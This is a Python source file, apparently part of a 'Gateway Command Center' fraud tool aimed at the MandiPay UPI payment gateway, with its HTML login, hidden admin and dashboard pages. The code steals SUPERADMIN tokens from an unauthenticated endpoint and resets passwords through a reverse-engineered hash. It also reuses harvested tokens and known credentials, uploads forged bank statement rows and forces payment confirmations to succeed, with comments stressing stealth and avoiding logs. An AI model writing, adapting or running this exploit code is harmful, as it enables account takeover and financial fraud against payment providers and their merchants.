_MANDI_ALLOWED_USERS = ["axel@banker", "mpayone", "mpaytwo", "mpaythree", "rdxsarkar", "maya@mandi"]

def _mandi_save_cache(user, password, token):
    try:
        with open(_MANDI_ADMIN_CACHE, "w") as f:
            json.dump({"user": user, "password": password, "token": token, "ts": time.time()}, f)
    except Exception:
        pass

def _mandi_load_cache():
    try:
        with open(_MANDI_ADMIN_CACHE) as f:
            return json.load(f)
    except Exception:
        return None

def _mandi_try_login(base, geo, username, password):
    """Try logging in with given creds. Returns token or None."""
    try:
        if HAS_REQ:
            r = requests.post(f"{base}/auth/token/system/create?{geo}",
                json={"username": username, "password": password},
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                verify=False, timeout=10)
            if r.status_code == 200:
                data = r.json()
                return data.get("token", "")
    except Exception:
        pass
    return None

def _mandi_reset_password(base, username, new_password):
    """Reset a user's password via unauthenticated endpoint.
    Uses the reverse-engineered encodedText hash (from session_findings)."""
    try:
        if HAS_REQ:
            from datetime import datetime as dt
            now = dt.now()
            time_string = now.strftime("%d%m%y%H%M")
            salt_str = "TEST_SALT" + time_string
            
            o = base64.b64encode(b"DummyOldPass!1").decode()  # old password (dummy — reset doesn't validate it server-side for this endpoint)
            a = base64.b64encode(new_password.encode()).decode()
            i = base64.b64encode(salt_str.encode()).decode()
            
            sha_o = hashlib.sha256(o.encode()).hexdigest()
            sha_a = hashlib.sha256(a.encode()).hexdigest()
            sha_i = hashlib.sha256(i.encode()).hexdigest()
            
            # Interleave: chars from each string alternating
            parts = [o, sha_o, a, sha_a, sha_i]
            max_len = max(len(p) for p in parts)
            encoded = ""
            for idx in range(max_len):
                for p in parts:
                    if idx < len(p):
                        encoded += p[idx]
            
            r = requests.post(
                f"{base}/auth/system/user/reset/password/{username}?encodedText={encoded}",
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False, timeout=10)
            return r.status_code == 200 and "SUCCESS" in r.text.upper()
    except Exception:
        pass
    return False

def _mandi_get_admin_token():
    """Get a MandiPay SUPERADMIN token. Maximum stealth — zero account creation, zero config changes.
    Priority: memory cache → disk cache → steal active token from user-list → known creds login."""
    with _mandi_admin_lock:
        # 1. Check in-memory cache
        if _mandi_admin["token"] and time.time() < _mandi_admin["expiry"]:
            return _mandi_admin["token"], _mandi_admin["user"]
        
        base = GATEWAYS["mandipay"]["base"]
        geo = _geo("super.mandipay.com")
        
        def _cache_token(tok, username, password=""):
            """Cache token in memory + disk."""
            _mandi_admin.update({"token": tok, "user": username, "expiry": time.time() + 600000})
            _mandi_save_cache(username, password, tok)
            return tok, username
        
        # 2. Try disk cache (survives restarts)
        cached = _mandi_load_cache()
        if cached and cached.get("token"):
            # Try using the cached token directly (no login = no logs)
            try:
                r = requests.get(f"{base}/api/v1/upi/config/get/all?user={cached['user']}&{geo}",
                    headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {cached['token']}",
                             "client-id": cached["user"], "access-path": "SYSTEM"},
                    verify=False, timeout=5)
                if r.status_code == 200:
                    return _cache_token(cached["token"], cached["user"], cached.get("password", ""))
            except Exception:
                pass
            # Cached token expired — try re-login
            if cached.get("password"):
                tok = _mandi_try_login(base, geo, cached["user"], cached["password"])
                if tok:
                    return _cache_token(tok, cached["user"], cached["password"])
        
        # 3. STEALTH: Steal active token from /auth/system/user/list-all (NO AUTH needed)
        #    Prioritize users already in manual-upd allowed-users → zero config changes
        try:
            if HAS_REQ:
                r = requests.get(f"{base}/auth/system/user/list-all",
                    headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=10)
                if r.status_code == 200:
                    users = r.json()
                    
                    # First pass: find allowed users with active tokens (MOST stealthy)
                    for u in users:
                        uname = u.get("username", "")
                        token = u.get("token", "")
                        if uname in _MANDI_ALLOWED_USERS and token and token.startswith("eyJ"):
                            if not u.get("disabled", False):
                                return _cache_token(token, uname)
                    
                    # Second pass: any SUPERADMIN with an active token
                    for u in users:
                        token = u.get("token", "")
                        roles = u.get("roles", [])
                        if token and token.startswith("eyJ") and "ROLE_SUPERADMIN" in roles:
                            if not u.get("disabled", False):
                                uname = u.get("username", "")
                                return _cache_token(token, uname)
        except Exception:
            pass
        
        # 4. OFFLINE VAULT: Pre-harvested tokens (works even if /user/list-all gets patched)
        _vault_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".token_vault.json")
        try:
            with open(_vault_path) as f:
                vault = json.load(f)
            mandi_tokens = vault.get("gateways", {}).get("mandipay", {}).get("tokens", [])
            # Prioritize already-allowed users
            for t in sorted(mandi_tokens, key=lambda x: x["user"] in _MANDI_ALLOWED_USERS, reverse=True):
                if t.get("disabled"): continue
                tok = t.get("token", "")
                uname = t.get("user", "")
                if tok and uname:
                    # Validate token is still alive
                    try:
                        rv = requests.get(f"{base}/api/v1/upi/config/get/all?user={uname}&{geo}",
                            headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {tok}",
                                     "client-id": uname, "access-path": "SYSTEM"},
                            verify=False, timeout=5)
                        if rv.status_code == 200:
                            return _cache_token(tok, uname)
                    except Exception:
                        continue
        except Exception:
            pass
        
        # 5. Fallback: login with known credentials
        for creds in _MANDI_KNOWN_CREDS:
            tok = _mandi_try_login(base, geo, creds["username"], creds["password"])
            if tok:
                return _cache_token(tok, creds["username"], creds["password"])
        
        return None, None

def _mandi_upload_statement(token, user, utr, amount):
    """Upload a GPay CSV statement entry for the given UTR+amount."""
    base = GATEWAYS["mandipay"]["base"]
    geo = _geo("super.mandipay.com")
    acct_id = _MANDI_GPAY_ACCOUNTS[0]
    
    csv_header = "Payer,Paid via,Type (UPI / UPI CC),Creation time,Transaction ID,Amount,Processing Fee,Net Amount,Status,Update time,Notes"
    now_str = datetime.now().strftime("%d/%m/%Y %H:%M")
    # Realistic payer VPA — random mobile number style
    payer_vpa = f"{random.randint(7000000000, 9999999999)}@upi"
    fee = round(int(amount) * 0.031, 2)  # 3.1% MDR matches their config
    net = round(int(amount) - fee, 2)
    csv_row = f"{payer_vpa},UPI,UPI,{now_str},{utr},{int(amount)},{fee},{net},Settled,{now_str},"
    csv_content = f"{csv_header}\n{csv_row}\n"
    
    try:
        if HAS_REQ:
            r = requests.post(
                f"{base}/api/v1/upi/api/statement/upload/gpay/{acct_id}?type=csv&user={user}&{geo}",
                files={"file": ("statement.csv", csv_content.encode(), "text/csv")},
                headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {token}",
                         "client-id": user, "access-path": "SYSTEM"},
                verify=False, timeout=15)
            if r.status_code == 200 and "Added" in r.text:
                return True
    except Exception:
        pass
    return False

def _mandi_find_txn(token, user, request_id):
    """Search payin report for a transaction by requestId. Returns (txnId, mid, amount) or None."""
    base = GATEWAYS["mandipay"]["base"]
    geo = _geo("super.mandipay.com")
    
    try:
        if HAS_REQ:
            today = datetime.now().strftime("%Y-%m-%d")
            r = requests.post(f"{base}/api/v1/upi/q/payin/report?user={user}&{geo}",
                json={"fromDate": today, "toDate": today},
                headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {token}",
                         "Content-Type": "application/json", "client-id": user, "access-path": "SYSTEM"},
                verify=False, timeout=30)
            if r.status_code == 200:
                for line in r.text.strip().split('\n')[1:]:
                    if request_id in line:
                        cols = line.split(',')
                        if len(cols) > 23:
                            return cols[13], cols[11], float(cols[18])
    except Exception:
        pass
    return None

def _mandi_confirm_admin(token, user, txn_id, mid, utr, amount):
    """Confirm a transaction via payin/update/manual/admin."""
    base = GATEWAYS["mandipay"]["base"]
    geo = _geo("super.mandipay.com")
    salt = "TEST_SALT"
    req_id = f"REQ{int(time.time())}"
    ts = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    amt = int(amount)
    
    hash_str = f"PAYIN_CALLBACK{req_id}{mid}{txn_id}{utr}SUCCESS_AUTO{amt}{amt}{salt}"
    h = hashlib.sha256(hash_str.encode()).hexdigest()
    
    body = {
        "header": {"msgType": "PAYIN_CALLBACK", "requestId": req_id, "timestamp": ts, "mid": mid},
        "txnId": txn_id, "utr": utr, "status": "SUCCESS_AUTO",
        "requestedAmount": amt, "processedAmount": amt, "hash": h
    }
    
    try:
        if HAS_REQ:
            r = requests.post(f"{base}/api/v1/upi/payin/update/manual/admin?user={user}&{geo}",
                json=body,
                headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {token}",
                         "Content-Type": "application/json", "client-id": user, "access-path": "SYSTEM"},
                verify=False, timeout=15)
            try: return r.status_code, r.json()
            except: return r.status_code, r.text
    except Exception as e:
        return 0, str(e)
    return 0, "requests not available"

def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
    """MandiPay stealth bypass for Google Pay VPAs.
    2-step native flow:
    1. Upload statement entry via a NON-Google proxy VPA (bypasses Google block)
    2. Admin confirm with same UTR → maps to target txn → SUCCESS_AUTO
    Looks exactly like a normal banker workflow. Zero noise."""
    
    base = GATEWAYS["mandipay"]["base"]
    salt = GATEWAYS["mandipay"]["salt"]
    
    # Get stolen token
    token, user = _steal_token("mandipay")
    if not token:
        token, user = _mandi_get_admin_token()
    if not token:
        return 500, "No token available"
    
    auth_h = {
        "User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
        "Authorization": f"Bearer {token}", "client-id": user, "access-path": "SYSTEM",
    }
    
    # Find txnId and MID from report or status API
    txn_id = None
    mid = None
    txn_amount = amount
    
    if request_id:
        today = datetime.now().strftime("%Y-%m-%d")
        for day_offset in range(3):
            _d = (datetime.now() - timedelta(days=day_offset)).strftime("%Y-%m-%d")
            try:
                r = requests.post(f"{base}/api/v1/upi/q/payin/report",
                    json={"fromDate": _d, "toDate": _d},
                    headers=auth_h, verify=False, timeout=12)
                if r.status_code == 200:
                    for line in r.text.strip().split('\n')[1:]:
                        cols = line.split(',')
                        if len(cols) > 7 and cols[3].strip() == request_id:
                            txn_id = cols[4].strip()
                            try: txn_amount = float(cols[7].strip())
                            except: pass
                            break
                if txn_id:
                    break
            except: continue
        
        # Get MID from status API
        if txn_id:
            try:
                r = requests.get(f"{base}/api/v1/upi/q/payin/status/{txn_id}",
                    headers=auth_h, verify=False, timeout=5)
                if r.status_code == 200:
                    sd = r.json()
                    mid = sd.get("header", {}).get("mid", "")
                    if sd.get("requestedAmount"):
                        txn_amount = float(sd["requestedAmount"])
            except: pass
    
    if not txn_id or not mid:
        return 404, f"Transaction not found for requestId: {request_id}"
    
    amount = txn_amount
    
    # STEP 1: Find a non-Google proxy VPA from account list
    proxy_vpa = None
    try:
        r = requests.get(f"{base}/api/v1/upi/account/list",
            headers=auth_h, verify=False, timeout=10)
        if r.status_code == 200:
            for a in r.json():
                v = a.get("vpa", "")
                if v and "@" in v and not any(x in v.lower() for x in ["okbiz", "okhdf", "gpay"]):
                    proxy_vpa = v
                    break
    except: pass
    
    if not proxy_vpa:
        # Hardcoded fallback proxy VPAs known to work
        for pv in ["9664348959@mairtel", "9876543210@ybl", "8888888888@upi"]:
            proxy_vpa = pv
            break
    
    # STEP 2: Upload statement entry using proxy VPA
    h = hashlib.sha256(f"{proxy_vpa}{utr}{float(amount)}{salt}".encode()).hexdigest()
    try:
        r = requests.post(f"{base}/api/v1/upi/api/statement/manual?user={user}",
            json={"vpa": proxy_vpa, "utr": utr, "amount": float(amount), "hash": h},
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            verify=False, timeout=10)
        if "successfully" not in r.text.lower():
            return 500, f"Statement upload failed: {r.text[:200]}"
    except Exception as e:
        return 500, f"Statement upload error: {str(e)}"
    
    time.sleep(0.5)
    
    # STEP 3: Admin confirm with same UTR
    import uuid as _uuid
    req_id = f"REQ{_uuid.uuid4().hex[:24].upper()}"
    ts = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    amt = int(amount)
    
    hash_str = f"PAYIN_CALLBACK{req_id}{mid}{txn_id}{utr}SUCCESS_AUTO{amt}{amt}{salt}"
    hash_val = hashlib.sha256(hash_str.encode()).hexdigest()
    
    payload = {
        "header": {"msgType": "PAYIN_CALLBACK", "requestId": req_id, "timestamp": ts, "mid": mid},
        "txnId": txn_id, "utr": utr, "status": "SUCCESS_AUTO",
        "requestedAmount": amt, "processedAmount": amt, "hash": hash_val
    }
    
    try:
        r = requests.post(f"{base}/api/v1/upi/payin/update/manual/admin?user={user}",
            json=payload, headers=auth_h, verify=False, timeout=15)
        try: resp = r.json()
        except: resp = r.text
        return r.status_code, resp
    except Exception as e:
        return 0, str(e)

def add_log(session_token, gw, action, detail1, detail2, utr, status, msg=""):
    s = get_session(session_token)
    if not s: return
    st = s["state"][gw]
    st["log"].insert(0,{"time":datetime.now().strftime("%H:%M:%S"),
        "action":action,"d1":detail1,"d2":detail2,"utr":utr,"status":status,"msg":msg})
    st["log"]=st["log"][:100]


# ─── Login Page ───
LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Payments — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#050510;color:#e4e4f8;min-height:100vh;display:flex;align-items:center;justify-content:center}
body::before{content:'';position:fixed;top:0;left:0;right:0;height:500px;background:radial-gradient(ellipse at 50% 0%,rgba(139,92,246,.08) 0%,transparent 70%);pointer-events:none}
.login-card{background:#0f0f24;border:1px solid rgba(100,100,200,.12);border-radius:20px;padding:48px 40px;width:380px;max-width:90vw;text-align:center;position:relative;z-index:1;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.login-icon{width:64px;height:64px;background:linear-gradient(135deg,#8b5cf6,#6d28d9);border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;color:#fff;margin:0 auto 20px;box-shadow:0 8px 30px rgba(139,92,246,.3)}
.login-card h1{font-size:22px;font-weight:800;margin-bottom:6px;background:linear-gradient(135deg,#e4e4f8,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.login-card p{font-size:12px;color:#7a7a9e;margin-bottom:28px}
.login-card input{width:100%;padding:14px 18px;background:#141430;border:1px solid rgba(100,100,200,.15);border-radius:12px;color:#e4e4f8;font-family:'JetBrains Mono',monospace;font-size:18px;text-align:center;letter-spacing:8px;outline:none;transition:border .2s;margin-bottom:16px}
.login-card input:focus{border-color:#8b5cf6}
.login-card input::placeholder{letter-spacing:2px;font-size:13px;color:#4a4a6e}
.login-card button{width:100%;padding:14px;background:linear-gradient(135deg,#8b5cf6,#7c3aed);color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;transition:all .15s;box-shadow:0 4px 16px rgba(139,92,246,.3)}
.login-card button:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(139,92,246,.4)}
.err{color:#ef4444;font-size:11px;margin-top:10px;display:none}
</style>
</head>
<body>
<div class="login-card">
<div class="login-icon">GC</div>
<h1>Command Center</h1>
<p>Enter access code to continue</p>
<form onsubmit="return doLogin()">
<input type="password" id="pw" placeholder="Access Code" autofocus autocomplete="off">
<button type="submit">Unlock</button>
</form>
<div class="err" id="err">Invalid access code</div>
</div>
<script>
async function doLogin(){
  const pw=document.getElementById('pw').value;
  const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
  const d=await r.json();
  if(d.ok){window.location.reload()}else{document.getElementById('err').style.display='block';document.getElementById('pw').value=''}
  return false;
}
</script>
</body></html>"""

# ─── Admin Panel (hidden) ───
ADMIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>X</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#050510;color:#e4e4f8;min-height:100vh;padding:24px}
.mono{font-family:'JetBrains Mono',monospace}
.hdr{text-align:center;margin-bottom:30px}
.hdr h1{font-size:18px;font-weight:800;color:#a78bfa;margin-bottom:4px}
.hdr p{font-size:11px;color:#7a7a9e}
.summary{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
.sm{background:#0f0f24;border:1px solid rgba(100,100,200,.12);border-radius:14px;padding:18px;text-align:center}
.sm-l{font-size:9px;font-weight:600;color:#7a7a9e;text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px}
.sm-v{font-family:'JetBrains Mono',monospace;font-size:24px;font-weight:700}
.sm-v.g{color:#10b981}.sm-v.b{color:#3b82f6}.sm-v.r{color:#ef4444}.sm-v.p{color:#a78bfa}
.sess{background:#0f0f24;border:1px solid rgba(100,100,200,.12);border-radius:14px;padding:20px;margin-bottom:16px}
.sess-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid rgba(100,100,200,.08)}
.sess-id{font-family:'JetBrains Mono',monospace;font-size:12px;color:#a78bfa;background:rgba(139,92,246,.08);padding:4px 10px;border-radius:6px}
.sess-time{font-size:10px;color:#7a7a9e}
.sess-stats{display:flex;gap:20px;margin-bottom:12px}
.ss{font-size:11px}.ss b{font-family:'JetBrains Mono',monospace}
.ss .g{color:#10b981}.ss .r{color:#ef4444}.ss .b{color:#3b82f6}
.log-item{display:flex;gap:10px;align-items:center;padding:6px 0;border-bottom:1px solid rgba(100,100,200,.04);font-size:11px}
.log-item .t{font-family:'JetBrains Mono',monospace;color:#4a4a6e;font-size:10px;min-width:50px}
.log-item .gw{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600}
.log-item .gw.ot{background:rgba(139,92,246,.1);color:#a78bfa}
.log-item .gw.mp{background:rgba(16,185,129,.1);color:#10b981}
.empty{text-align:center;color:#4a4a6e;padding:20px;font-size:12px}
@media(max-width:600px){.summary{grid-template-columns:1fr 1fr}.sm-v{font-size:20px}}
</style>
</head>
<body>
<div class="hdr"><h1>Session Monitor</h1><p id="updated"></p></div>
<div class="summary">
<div class="sm"><div class="sm-l">Active Devices</div><div class="sm-v p" id="s-dev">0</div></div>
<div class="sm"><div class="sm-l">Total Confirmed</div><div class="sm-v g" id="s-conf">0</div></div>
<div class="sm"><div class="sm-l">Total Amount</div><div class="sm-v b" id="s-amt">₹0</div></div>
<div class="sm"><div class="sm-l">Total Failed</div><div class="sm-v r" id="s-fail">0</div></div>
</div>
<div id="sessions"><div class="empty">Loading...</div></div>
<script>
async function load(){
  try{
    const r=await fetch('/api/admin/sessions?key=369369');
    const d=await r.json();
    document.getElementById('s-dev').textContent=d.total_sessions;
    let tc=0,ta=0,tf=0;
    d.sessions.forEach(s=>{tc+=s.confirmed;ta+=s.amount;tf+=s.failed});
    document.getElementById('s-conf').textContent=tc;
    document.getElementById('s-amt').textContent='₹'+ta.toLocaleString('en-IN');
    document.getElementById('s-fail').textContent=tf;
    document.getElementById('updated').textContent='Updated: '+new Date().toLocaleTimeString('en-IN',{hour12:false});
    const c=document.getElementById('sessions');
    if(!d.sessions.length){c.innerHTML='<div class="empty">No active sessions</div>';return}
    c.innerHTML=d.sessions.map(s=>`<div class="sess">
      <div class="sess-h"><span class="sess-id">${s.id}</span><span class="sess-time">Since ${s.created.split('T')[1].split('.')[0]}</span></div>
      <div class="sess-stats">
        <div class="ss">Confirmed: <b class="g">${s.confirmed}</b></div>
        <div class="ss">Amount: <b class="b">₹${s.amount.toLocaleString('en-IN')}</b></div>
        <div class="ss">Failed: <b class="r">${s.failed}</b></div>
      </div>
      ${s.logs.length?s.logs.map(l=>`<div class="log-item"><span class="t">${l.time}</span><span class="gw ${l.gw==='oneten'?'ot':'mp'}">${l.gw==='oneten'?'OT':'MP'}</span><span>${l.status==='OK'?'✅':'❌'}</span><span>${l.action} ${l.d1} ₹${l.d2} UTR:<span class="mono">${l.utr||'—'}</span></span></div>`).join(''):'<div class="empty">No activity yet</div>'}
    </div>`).join('');
  }catch(e){document.getElementById('sessions').innerHTML='<div class="empty">Error: '+e+'</div>'}
}
setInterval(load,4000);load();
</script>
</body></html>"""

# ─── HTML ───
HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Gateway Command Center</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#050510;--s:#0f0f24;--c:#141430;--c2:#1a1a3a;--b:rgba(100,100,200,.12);--bh:rgba(130,100,255,.25);
--t:#e4e4f8;--d:#7a7a9e;--m:#4a4a6e;--a:#8b5cf6;--a2:#a78bfa;--ag:rgba(139,92,246,.08);
--g:#10b981;--gg:rgba(16,185,129,.08);--gb:rgba(16,185,129,.3);
--r:#ef4444;--rg:rgba(239,68,68,.08);--y:#f59e0b;--yg:rgba(245,158,11,.08);
--bl:#3b82f6;--blg:rgba(59,130,246,.08);--rad:14px}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--t);min-height:100vh}
body::before{content:'';position:fixed;top:0;left:0;right:0;height:500px;background:radial-gradient(ellipse at 50% 0%,rgba(139,92,246,.05) 0%,transparent 70%);pointer-events:none}
.mono{font-family:'JetBrains Mono',monospace}.shell{max-width:1480px;margin:0 auto;padding:24px 28px;position:relative;z-index:1}
header{display:flex;align-items:center;justify-content:space-between;padding-bottom:20px;margin-bottom:20px;border-bottom:1px solid var(--b)}
.brand{display:flex;align-items:center;gap:14px}
.brand-icon{width:44px;height:44px;background:linear-gradient(135deg,#8b5cf6,#6d28d9);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;color:#fff;box-shadow:0 4px 20px rgba(139,92,246,.3)}
.brand h1{font-size:22px;font-weight:800;letter-spacing:-.7px;background:linear-gradient(135deg,#e4e4f8,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.brand small{display:block;font-size:10px;font-weight:500;color:var(--d);letter-spacing:.5px;margin-top:1px}
.hdr-r{display:flex;align-items:center;gap:12px}
.pill{display:flex;align-items:center;gap:7px;padding:7px 14px;background:var(--s);border:1px solid var(--gb);border-radius:20px;font-size:11px;font-weight:600;color:var(--g)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:blink 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.clk{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--d);padding:7px 12px;background:var(--s);border:1px solid var(--b);border-radius:8px}

/* Tabs */
.tabs{display:flex;gap:4px;margin-bottom:20px;background:var(--s);padding:4px;border-radius:12px;border:1px solid var(--b);width:fit-content}
.tab{padding:10px 28px;border-radius:9px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;color:var(--d);position:relative}
.tab:hover{color:var(--t)}
.tab.active{background:var(--c2);color:#fff;box-shadow:0 2px 12px rgba(0,0,0,.3)}
.tab .tdot{width:6px;height:6px;border-radius:50%;display:inline-block;margin-right:6px}
.tab-oneten .tdot{background:#8b5cf6}.tab-mandipay .tdot{background:#10b981}.tab-wolf777 .tdot{background:#f59e0b}
.tab.active.tab-oneten{border:1px solid rgba(139,92,246,.3)}.tab.active.tab-mandipay{border:1px solid rgba(16,185,129,.3)}.tab.active.tab-wolf777{border:1px solid rgba(245,158,11,.3);background:linear-gradient(135deg,#b45309,#d97706)}
.gw-panel{display:none}.gw-panel.active{display:block}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
.st{background:var(--c);border:1px solid var(--b);border-radius:var(--rad);padding:18px 20px;transition:all .2s;position:relative;overflow:hidden}
.st::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;opacity:0;transition:opacity .2s}
.st:hover{border-color:var(--bh);transform:translateY(-1px)}.st:hover::before{opacity:1}
.st-l{font-size:10px;font-weight:600;color:var(--d);text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
.st-v{font-family:'JetBrains Mono',monospace;font-size:26px;font-weight:700}
.st-s{font-size:10px;color:var(--m);margin-top:4px}
.st.grn .st-v{color:var(--g)}.st.grn::before{background:var(--g)}
.st.red .st-v{color:var(--r)}.st.red::before{background:var(--r)}
.st.blu .st-v{color:var(--bl)}.st.blu::before{background:var(--bl)}

/* Grid */
.g2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}
.cd{background:var(--c);border:1px solid var(--b);border-radius:var(--rad);overflow:hidden}
.cd-h{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--b);background:rgba(139,92,246,.02)}
.cd-t{font-size:13px;font-weight:700}.cd-b{padding:16px 18px}
.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:6px;font-size:10px;font-weight:600;letter-spacing:.3px}
.badge-a{background:var(--ag);color:var(--a2);border:1px solid rgba(139,92,246,.2)}
.badge-g{background:var(--gg);color:var(--g);border:1px solid rgba(16,185,129,.2)}
.badge-y{background:var(--yg);color:var(--y);border:1px solid rgba(245,158,11,.2)}
.badge-r{background:var(--rg);color:var(--r);border:1px solid rgba(239,68,68,.2)}
.badge-bl{background:var(--blg);color:var(--bl);border:1px solid rgba(59,130,246,.2)}

/* Form */
.fr{display:flex;gap:10px;margin-bottom:12px;align-items:end}
.fg{flex:1}
.fg label{display:block;font-size:10px;font-weight:600;color:var(--d);text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px}
.fg input,.fg select{width:100%;padding:9px 12px;background:var(--s);border:1px solid var(--b);border-radius:8px;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;transition:border .2s}
.fg input:focus,.fg select:focus{border-color:var(--a)}
.fg input::placeholder{color:var(--m)}
.btn{padding:9px 20px;border:none;border-radius:8px;font-family:'Inter',sans-serif;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s}
.btn-p{background:linear-gradient(135deg,#8b5cf6,#7c3aed);color:#fff;box-shadow:0 3px 12px rgba(139,92,246,.3)}
.btn-g{background:linear-gradient(135deg,#10b981,#059669);color:#fff;box-shadow:0 3px 12px rgba(16,185,129,.3)}
.btn:hover{transform:translateY(-1px)}.btn-s{padding:6px 12px;font-size:10px}
.btn-o{background:transparent;border:1px solid var(--b);color:var(--d)}.btn-o:hover{border-color:var(--a);color:var(--a2)}

/* Table */
.tbl{width:100%;border-collapse:collapse}
.tbl th{font-size:9px;font-weight:700;color:var(--d);text-transform:uppercase;letter-spacing:.8px;padding:8px 12px;text-align:left;border-bottom:1px solid var(--b)}
.tbl td{font-size:11px;padding:10px 12px;border-bottom:1px solid rgba(100,100,200,.05)}
.tbl tbody tr:hover{background:rgba(139,92,246,.03)}
.vpa{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--a2)}
.amt{font-family:'JetBrains Mono',monospace;font-weight:600}
.empty{text-align:center;padding:30px;color:var(--m);font-size:12px}
.log-e{display:flex;align-items:center;gap:12px;padding:8px 12px;border-bottom:1px solid rgba(100,100,200,.04);font-size:11px}
.log-e:hover{background:rgba(139,92,246,.02)}
.log-t{font-family:'JetBrains Mono',monospace;color:var(--m);font-size:10px;min-width:55px}
.log-d{flex:1;color:var(--d)}.log-d b{color:var(--t);font-weight:600}

/* Toggle */
.tog{position:relative;width:40px;height:22px;cursor:pointer;display:inline-block}
.tog input{opacity:0;width:0;height:0}
.tog .sl{position:absolute;inset:0;background:var(--s);border:1px solid var(--b);border-radius:11px;transition:all .2s}
.tog .sl::before{content:'';position:absolute;width:16px;height:16px;border-radius:50%;background:#fff;left:2px;bottom:2px;transition:transform .2s}
.tog input:checked+.sl{background:var(--g);border-color:var(--g)}.tog input:checked+.sl::before{transform:translateX(18px)}
.fx{display:flex;align-items:center;gap:8px}

.toast-c{position:fixed;top:16px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:6px}
.toast{padding:12px 18px;border-radius:8px;font-size:12px;font-weight:500;animation:si .3s;box-shadow:0 6px 24px rgba(0,0,0,.4)}
.toast.ok{background:rgba(16,185,129,.15);border:1px solid rgba(16,185,129,.3);color:var(--g)}
.toast.err{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.3);color:var(--r)}
@keyframes si{from{opacity:0;transform:translateX(30px)}to{opacity:1;transform:translateX(0)}}
.method-tag{display:inline-flex;padding:3px 8px;border-radius:4px;font-size:9px;font-weight:700;letter-spacing:.5px}
.method-tag.stmt{background:rgba(139,92,246,.12);color:#a78bfa}.method-tag.direct{background:rgba(16,185,129,.12);color:#10b981}

/* ─── Mobile Responsive ─── */
@media(max-width:1024px){
.stats{grid-template-columns:repeat(3,1fr)}.g2{grid-template-columns:1fr}
.shell{padding:16px 18px}
}
@media(max-width:768px){
.stats{grid-template-columns:repeat(2,1fr);gap:8px}
.st{padding:14px 16px}.st-v{font-size:22px}
header{flex-direction:column;align-items:flex-start;gap:12px}
.hdr-r{width:100%;justify-content:space-between}
.brand h1{font-size:18px}
.tabs{width:100%}.tab{flex:1;text-align:center;padding:9px 12px;font-size:12px}
.tab .mono{display:none}
.g2{grid-template-columns:1fr;gap:12px}
.fr{flex-direction:column;gap:8px}
.fr .fg{flex:unset!important;width:100%}
.fr .btn{width:100%;text-align:center}
.cd-h{padding:12px 14px;flex-wrap:wrap;gap:8px}
.cd-h .fx{flex-wrap:wrap;gap:6px}
.cd-b{padding:14px}
.tbl th,.tbl td{padding:8px 8px;font-size:10px}
.shell{padding:12px 14px}
}
@media(max-width:480px){
.stats{grid-template-columns:1fr 1fr;gap:6px}
